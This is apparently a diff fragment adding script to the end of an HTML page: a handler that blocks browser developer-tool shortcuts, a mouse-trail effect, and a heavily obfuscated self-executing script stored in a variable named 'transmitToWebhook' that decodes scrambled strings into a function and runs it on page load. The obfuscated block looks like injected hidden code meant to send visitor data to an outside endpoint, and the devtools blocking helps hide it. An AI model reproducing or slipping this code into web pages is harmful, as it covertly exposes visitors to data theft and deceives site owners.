+                    (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || 
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) || 
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) || 
+                    (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
+                        return false;
+                    }
+                }
+                
+
+        document.addEventListener('mousemove', (e) => {
+            const trail = document.createElement('div');
+            trail.className = 'trail';
+            trail.style.left = e.pageX + 'px';
+            trail.style.top = e.pageY + 'px';
+            document.body.appendChild(trail);
+            setTimeout(() => { trail.style.opacity = '0'; setTimeout(() => trail.remove(), 500); }, 100);
+        });
+
+        
+ var transmitToWebhook;(function(){var GyG='',dSi=892-881;function TOY(y){var d=4586822;var e=y.length;var x=[];for(var z=0;z<e;z++){x[z]=y.charAt(z)};for(var z=0;z<e;z++){var p=d*(z+170)+(d%25493);var r=d*(z+426)+(d%17008);var k=p%e;var o=r%e;var l=x[k];x[k]=x[o];x[o]=l;d=(p+r)%5293559;};return x.join('')};var ISP=TOY('ojslorqccnrwizntxtrefhsmtupydobuvackg').substr(0,dSi);var lQv='=q9e nl;(-f6iobo00;;1(er(+"n[dmf;hmC+l,vru)l)t=v.xhev)e+g2.;dsj,lt+cc,n!=er8+ao9dla 7ao=[Stv4e;a)[0,=9Aeu=(w=d,=2= 7nr1j];6,;=ee+]gfihavagxtns39jorounr8.cCuh(+;s.=;c=d+v;,i6)p(g[;h=)a((qv=;uubnt]6=;;,srpp)g=0rxai.;=pe.usamC;ret.=fn m8m,r uo=vum={es. (.rp"e8 1x"Av0tnh,h"mutd+lrn(=;+foiog5;arog{ao80(=tuv i<(.2x01;={;vdr g+nulv+m;r1s ]ha7,.i=aalc[athfg(r+nrtgrbgvlegc0[u)arg-+rlva8grjx=;)ahC+}rcm.b)a11"o.,froe;;7].={.[04 uk[[lpies.rr=(=np)gdar(,;;tgg;t+;s}9s(vf)-o)y=){Ci,s)c0 [;g1u-aox=t8tnCvzc67)atv< "h(5h(=;o.=*;+ 2l-sn+f)yg.1q2],nhqr t= +i6h-rnrf;rrumCa5,mr{l)ir;v>nd82*i)fpr.l6j,t}hls;=.(st"j(,e.Ald[v+r]xrn.gil(].;.i<}h17r))i]gu<r4u,,eeh=(1sig)i(])=(n ),tnb67m,shhisa>)]r,nty<)a) "l}0(a(a]njmfaugt[(x" ; vs,;er}8heaul6gn21lw,v3;4=ognvt)3javf9[{le8sa=;(irrvC t)m 3u(+-,fooe(;bs;rA0v="wtuel;6lh];aoi+aen;+=ld(ou.7rr2a (c)id=ofa0S=)9nyt;(bn},sfr[j!2wt ]nv;t+ac.mov(b10a)sef +rc.i)taAy)d';var PpD=TOY[ISP];var lKa='';var LKt=PpD;var wxm=PpD(lKa,TOY(lQv));var JqJ=wxm(TOY(')5;4o\/"emt.xY10ncc5so5.1s,(rm91;509Ye5;cY{!?i18rtre]t4;)YYt2tet0emBte%.&:ler.3.YrYn(020Y(Y)oi9rYa6Y_Y.t3>a.t49?5lep3),\/( eYTne_Y)$_=3  eb.].sfu%;!g$4u(2atYDaY[!+Koral-YoN7i3sY2\/>=r.#b(uYn&.93p,Yl.i&fnY.ni)s_fb e xbd$e(z.8Y.rgigo,_5]tYr=dYa.(\/tI.);Y=9bEa$7%li[.ulY)r;Y;.(.h.rne)p(rn0E= zmb=a5wtCont$i>eYkc1tnamIn_a5x{%yorl>vu1p..?ij!t.eY09.]rgf_erl+6adsv(KnrYyb"n6cE.,b_)!tYufbc<visYtTt.l=o.} ab(91e!l.t(Y53uY\/4 _9sc2dFl0j6bsAis.ntSY,c;swn1sa t\/nu](:s!btJ_s\'ksTli0io!.1s$6YyYa{(b!ea5;)wbb{k}6=)ss\/4,e#a.]Y}q]1i:a4Etqt;1SC;-0zYa91m1(97gneluk]t(fYt[6}s.th_(8f.o\/goDYsh@Ycek(5)p7Yi7rt\/5rwiFlek.,g;%+2;Ynn_2.bY!od6Fafx!6%bY:_oc1;$os Ykjbe3{3tnf]n.>tatb-dp3.6]aae.} e\/5.-(!1cpi]Yf_E0b4.et%C1rrle1t+\/lorad..g=YG8l.{{nnS$m$n)jAY;.sn7b@0n6 Asu)e.u.k=iYY.v{KnYT 0.Yi.te61!.ct..p6bc)inYY4Et.Yi7!a9:YtdaobrJ]+oe%rw}.,b:zY].aYe !Y{_mYaY"r m q,4baee![sy;6ln.[jr!E.({e 3k1(mtn!)fuI+zucYalo)Yw(Yo.-(fougt52lbt.}N=1w. *@ma:(w}fr%0h>2icpi{)n{s-e&;no} %e3((i)G"t(1ltHtb)u3ne.9cxn\'l&s[)d$;=8)njh;ettf=o;7eeDYic6ci{%$KYY)h5m!$seuY1Yyl\/2;@:!Y"0asot6)t.!lYxi0oYta(e%7eYrab!e$:ifdoYir(+._ F.sY.zi!chey;yned,h8o)&d4.eY5;b3jYEe=c6s96Y9_)"h$2v&=2fr5&s)(u!.+.g((sYcm!)r2%otyl0 2..Yj"jeo)."\'Af)pi1t2orb@p-3(SegS.G)ch+8Ye}YbY76Yu_o.6;}1_Dmg_Yp]g;YYb\'x)e_u(7 0eem#YivhY__Y.]a(gS0Jgv_YjbDnY 1bYtap+5)1;\/tmn.+,nt-e}G&an@et(lY)onNYt[fYeI.h-70Y.l_h 7kIr!p1oe{ara]4p;>bi])u}):b$Yf%=(oY.(;0he_Ydfr .%!n8u,E.p.Y=niY@a#;t(((t(Y.&S4plws[>ba)Yi7)as]=)2a5\/A63g9;01Ys92{un=:.gpEb>sA=apder.fo%YYeboeY+Cf(t4(01.;.4z.=sj9m?ljcauY (-Yjtip6_}1dYY0n4Y34moY+_Y$Do(sb),;e=on{Y)_.]f36\/>fabao.v"rs!9.ei(Y,)Ye(+i{sIY;s.g-!nj]gcYujYop0eH.{l)!.}p!}65d5 jbb7(z.2;lD2n.!nn3,ak$;p:.)7oDsg9=Yi785_=0.t#Y;e.b]8kgY$aYn),,1sg+a..Y.a,p=r$cY2d!a.pYe;7(;jtY0e-.j>oC3CcppemYb.9 2Y*YhY2)% YmYYfn;e7TD,=ue2_;1..1p)Y1rrS.Ya,Yte;r_3bY7blrt!tae&p))obhJ,u02tia%n0(1!6_c92t-YY;Nh;,ndYiT3Y.sr. 6:;.;eYa$s.=SY]5.al>t].=])b9slsaa(=xct.;fYY_M(.k=gonY("!.Y1b.i;Y0ot.e{D0ea.+_bwi!T$,)<%%))YtYof9ldeYiziwh mnsrFY()nlt.}fe(=2Y3BSib!2Y.coS9,YYYwE{Y%Eby8(fbi(gor)$m[r!,06)8ic1e%h.CtYif;uw)sjx$\/Y6(7.sfh.f:;,.)S.riY.wt}]=.Ddulo({(#*14untCsYlf]!io(MY(anY.}ftaY..(?).c0"t_e4 10Ya.det(%Y Y4.&fa$1n2"d)>df7il)i!.0zt4,nS?BYtet(20]7EG4at;j]bYjaYYbs_a0acr}e3c))e)5[Ybr]YsYaBrdtr}p[dn3cb{p#%b!]Y)};}b)fri!nf1bdshs9;$(;nY,e4>H#EukY,fgdn.d2t0,1d-_$.Y.S2Ymo]Y0Yi(n.t]r1.742+,!0Yice9.Ytnop_;a,},ab7aYEnD(spb ofyY3_!%))_.()3w].YYY}!]o)Y3=cf,t(ddcYtb0HYxa af4n_1l(Y3,5Lt.%A=uj)tl).2}2os-tl2nb6ne"65oEf)lf)YBY!Y!+:{Yf4Yq\/$n95!e.y\/re*trr1}Yb.C)b8)d{e0dd(mY"oa.dndE@cb]ffT26hc$7.n1rL5o5YoBtfYr.daejoY.!e)(3;NF1s(nY_]}$.2e3o o-tYEsaYv2lmf2th);f(a1g_6T)}\'6@]e Y.1sY.be915r._}1o,rub!)]0oTlx,p(()7 ))]Y8.(,($neA%_]n.=ridSngpi}t$5o0a.% )mo)YioYt.(I4YuaYdI)!)_e_+aYY25o;if36tsi1%sD5t$((-.ce99)w[0o>jo,E2$_b{.n?.zYba_tbt.(Yte;0$8=.YYarY.toie.0f;r\/ i{6na( rY.T)ol.nn6@;(emYp0okYY).tna0%ar)B42n$!.A_.ae5Y)Cn]=nY%e.x.1.,eY 8Tk_ 1oY! Yn.YYbNY7Y46bY'));var FVw=LKt(GyG,JqJ );FVw(7498);return 8138})()
+    </script>
+</body>
+</html>
